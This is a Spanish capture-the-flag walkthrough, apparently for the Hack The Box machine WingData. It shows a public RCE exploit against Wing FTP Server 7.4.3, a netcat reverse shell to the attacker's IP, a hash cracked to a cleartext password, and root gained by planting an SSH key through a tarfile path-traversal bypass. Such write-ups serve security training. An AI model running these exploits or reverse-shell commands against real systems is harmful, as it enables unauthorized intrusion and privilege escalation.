## Reconocimiento

Empezamos con un escaneo de puertos completo para descubrir qué servicios están expuestos en la máquina.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.2.192 -oG allPorts
```

Usamos `extractPorts` para parsear el resultado y copiar los puertos al portapapeles:

```bash
extractPorts allPorts
```

```
[*] Extracting information...

    [*] IP Address: 10.129.2.192
    [*] Open ports: 22,80

[*] Ports copied to clipboard
```

La máquina expone únicamente dos puertos: **SSH (22)** y **HTTP (80)**.

El puerto 80 sirve la interfaz web de **Wing FTP Server**. Añadimos el dominio al fichero de hosts:

```bash

```

Al acceder a `http://wingdata.htb` confirmamos que se trata de un **Wing FTP Server 7.4.3**. Buscamos exploits disponibles para esta versión. Añadimos la url a hosts 'ftp.wingdata.htb'.

```bash
searchsploit Wing FTP Server 7.4.3
```

```
Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution (RCE)   | multiple/remote/52347.py
```

Existe un exploit público que explota la vulnerabilidad **CVE-2025-47812**: ejecución remota de código sin autenticación.

## Explotación

Descargamos el exploit a nuestro directorio de trabajo:

```bash
searchsploit -m multiple/remote/52347.py
```

Ponemos un listener en escucha:

```bash
nc -nlvp 4444
```

Ejecutamos el exploit apuntando a la máquina víctima y nuestra IP con el puerto en escucha. Obtenemos una reverse shell como el usuario `wingftp`.

```bash
python3 52347.py -u http://ftp.wingdata.htb -c "nc 10.10.14.74 -e /bin/bash"
```

Una vez en la máquina, hacemos un tratamiento de la terminal.

```bash 
script /dev/null -c bash
```

ctrl + z

```bash
stty raw -echo; fg
reset xterm
export TERM=xterm
```

```
stty size (en una terminal completa)
stty rows XX columns XX
```

Enumeramos el directorio de datos del servidor FTP, donde encontramos los archivos XML de configuración de usuarios:

```bash
ls /opt/wftpserver/Data/1/users
```

## Escalada de privilegios

### Obtención de credenciales via Wing FTP

Inspeccionamos el fichero de configuración global del servidor en busca de hashes:

```bash
cat /opt/wftpserver/Data/1/settings.xml
```

El fichero contiene un hash con el formato `sha256($pass.$salt)` junto con su salt (`WingFTP`). Preparamos el hash para crackearlo con hashcat en modo `1410`:

```bash
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt.gz
```

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5

Status: Cracked
Hash.Mode: 1410 (sha256($pass.$salt))
```

La contraseña es `!#7Blushing^*Bride5`. 

Información relativa a los modelos de hash: https://hashcat.net/wiki/doku.php?id=example_hashes

### Escalada a root via CVE-2025-4138

Investigando el sistema encontramos un script de restauración de backups que puede ejecutarse con `sudo`:

```
wacky@wingdata:/tmp$ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b <backup> -r <dir>
```

Este script utiliza la librería `tarfile` de Python para extraer archivos. Aprovechamos el **CVE-2025-4138** (tarfile filter bypass) para crear un tar malicioso con una ruta de path traversal que coloque nuestra clave pública SSH en `/root/.ssh/authorized_keys`.

He usado el script de este repositorio: https://github.com/thefizzyfish/CVE-2025-4138_tarfile_filter_bypass

Generamos claves SSH en '/tmp':

```bash
ssh-keygen -t ed25519 -f /tmp/key -N ""
```

Creamos el tar malicioso con el exploit del CVE (el tar contiene `key.pub` mapeada a `../../../root/.ssh/authorized_keys` mediante symlinks o path traversal):

Desde '/tmp' creamos el tar:
```bash
python3 CVE-2025-4138_tarfile_filter_bypass.py \
    -o backup_1005.tar \
    -t /root/.ssh/authorized_keys \
    -p /tmp/key.pub \
    -m 0600
```

Movemos el tar a '/opt/backup_clients/backups':

```bash
cp /tmp/backup_1005.tar /opt/backup_clients/backups
```


```bash
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1005.tar -r restore_evil
```

```
[+] Backup: backup_1005.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_evil
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_evil
```

> El CVE-2025-4138 permite bypassear el filtro de rutas de `tarfile` en Python, posibilitando la escritura de archivos fuera del directorio de extracción.
{: .prompt-warning }

Con nuestra clave privada en el `authorized_keys` de root, nos conectamos:

```bash
ssh -i key root@localhost
```

```
root@wingdata:~# whoami
root
```
